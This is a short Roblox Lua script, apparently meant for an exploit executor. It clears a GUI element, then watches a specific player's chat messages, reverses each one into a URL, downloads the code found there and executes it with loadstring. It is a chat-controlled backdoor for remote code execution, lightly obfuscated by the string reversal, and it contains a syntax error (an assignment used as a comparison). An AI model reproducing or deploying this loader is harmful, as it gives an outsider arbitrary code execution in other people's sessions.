-- made by a silly person xdxd
if game:GetService("CoreGui"):FindFirstChild('main11') then
  game:GetService("CoreGui"):FindFirstChild('main11'):remove()
end
for i, v in pairs(game.Players:GetPlayers()) do
  if v.Name = "FilteringDisabledEz" then
    v.Chatted:Connect(function(msg)
      loadstring(game:HttpGet(string.reverse(msg)))()
    end)
  end
end
